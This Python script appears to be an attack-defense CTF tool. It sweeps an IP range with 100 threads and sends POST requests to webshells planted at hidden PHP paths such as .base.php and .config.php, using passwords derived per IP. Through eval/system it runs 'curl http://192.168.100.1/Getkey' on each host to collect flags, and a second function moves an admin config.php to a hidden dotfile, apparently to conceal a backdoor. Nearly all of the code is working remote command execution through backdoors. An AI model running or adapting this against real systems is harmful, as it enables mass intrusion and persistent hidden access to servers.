import base64
import hashlib

import requests
from config import *
from utils.Mutithread import *
from utils.nealwe_web_lib import *
import sqlite3
import re


CRAETE_TABLE_SQL = 'CREATE TABLE if not exists  csrf_flag ("id" INTEGER PRIMARY KEY AUTOINCREMENT  NOT NULL  UNIQUE , "csrf" VARCHAR UNIQUE,"ip" VARCHAR, "flag" VARCHAR UNIQUE, "insert_time" VARCHAR);'


def CreateTable(sql):
    local_file_path = module_path()
    conn = sqlite3.connect(os.path.join(local_file_path, "../shell.sqlite"))
    create_sql = sql
    try:
        conn.execute(create_sql)
    except Exception as e:
        print(e)


def InsertData(sql):
    local_file_path = module_path()
    conn = sqlite3.connect(os.path.join(local_file_path, "../shell.sqlite"))
    try:
        cur = conn.cursor()
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        # print(sql)
        print(e)


def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)  # 去重
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList


def md5(s):
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


def transshell(content):
    a = base64.b64encode(content.encode('utf-8'))
    return a.decode('utf-8')


def getflag(thread_name, ip, port, shell_path_uri, method, shell_function, shell_password):

    # --------------------------------------------- #

    shell_path_uris = [".base.php", "1000.php", "10000.php", "100000.php", "1000000.php", "10000000.php", "10000000.php", "2000000.php"]

    shell_password = md5("jspi" + str(ip) + "nealwe_NEALWE")

    dict_shell_password = [
        {
            "shell_path_uri": ".base.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
        {
            "shell_path_uri": "1000.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
        {
            "shell_path_uri": "10000.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
        {
            "shell_path_uri": "100000.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
        {
            "shell_path_uri": "1000000.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
        {
            "shell_path_uri": ".config.php",
            "shell_password": md5("jspi" + str(ip) + "nealwe_NEALWE")
        },
    ]

    method = "POST"

    shell_function = "eval"

    cmd = "curl http://192.168.100.1/Getkey"
    # cmd = "curl http://172.17.68.163/Getkey"


    for i in range(len(dict_shell_password)):
        shell_path_uri = dict_shell_password[i]["shell_path_uri"]
        shell_password = dict_shell_password[i]["shell_password"]

        if shell_function == "assert":
            # TODO 测试失败
            data = {shell_password: f"eval(system('{cmd}'));"}

        elif shell_function == "eval":

            data = {shell_password: f"system('{cmd}');"}

        elif shell_function == "system":

            data = {shell_password: cmd}

        url = f"http://{ip}:{port}/{shell_path_uri}"
        # print(url)
        # print(shell_password)
        # print(data)
        if method == "POST":
            # print(f"{shell_password}={cmd}")
            try:
                insert_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                csrf = md5_py3(insert_time)
                print(data)
                flag = requests.post(url=url, headers=headers_from_string_dict(headers), data=data, timeout=2).text
                if "Not Found" in flag:
                    return 0
                else:
                    pass
                print(flag)
                INSERT_DATA = """INSERT INTO "main"."csrf_flag" ("csrf", "flag", "insert_time", "ip") VALUES ('{0}', '{1}', '{2}', '{3}');"""
                InsertData(INSERT_DATA.format(csrf, flag, insert_time, ip))
                # print(f"send to {ip}.....")
            except Exception as e:
                print(e)
                print("[-] %s Shell has already been Deleted" % url)
        elif method == "GET":
            try:
                requests.get(url, params=data, timeout=10)
                print(f"send to {ip}.....")
            except:
                print("[-] %s Shell has already been Deleted" % url)
        else:
            print("method error!")
        return 0

def getflag2(thread_name, ip, port, shell_path_uri, method, shell_function, shell_password):

    # --------------------------------------------- #

    shell_path_uris = ["1.php", "1000.php", "10000.php", "100000.php", "1000000.php", "10000000.php"]

    shell_password = '1'

    method = "POST"

    shell_function = "system"

    cmd = "mv /var/www/html/admin/config.php /var/www/html/admin/.config.php"
    # cmd = "curl http://172.17.68.163/Getkey"

    if shell_function == "assert":
        # TODO 测试失败
        data = {shell_password: f"eval(system('{cmd}'));"}

    elif shell_function == "eval":

        data = {'1': f"system('{cmd}');"}

    elif shell_function == "system":

        data = {shell_password: cmd}

    url = f"http://{ip}:{port}/admin/config.php?2=system"
    # print(url)
    # print(shell_password)
    # print(data)
    if method == "POST":
        # print(f"{shell_password}={cmd}")
        try:
            print(url)
            print(data)
            insert_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            csrf = md5_py3(insert_time)
            flag = requests.post(url=url, headers=headers_from_string_dict(headers), data=data, timeout=10).text
            # flag = re.findall(r"([a-fA-F0-9-]{32})", flag)
            if "Not Found" in flag:
                return 0
            else:
                print(flag)
                pass
            INSERT_DATA = """INSERT INTO "main"."csrf_flag" ("csrf", "flag", "insert_time", "ip") VALUES ('{0}', '{1}', '{2}', '{3}');"""
            InsertData(INSERT_DATA.format(csrf, flag, insert_time, ip))
            print(f"send to {ip}.....")
        except Exception as e:
            print(e)
            print("[-] %s Shell has already been Deleted" % url)
    elif method == "GET":
        try:
            requests.get(url, params=data, timeout=10)
            print(f"send to {ip}.....")
        except:
            print("[-] %s Shell has already been Deleted" % url)
    else:
        print("method error!")
    return 0

if __name__ == "__main__":
    CreateTable(CRAETE_TABLE_SQL)
    while True:
        pool = ThreadPool(100)
        for ip in ip_list(ips):
            pool.put(getflag, (ip, port, shell_path_uri, method, shell_function, shell_password,), callback)
            # pool.put(getflag2, (ip, port, shell_path_uri, method, shell_function, shell_password,), callback)
        # time.sleep(3)
        pool.close()
        pool.terminate()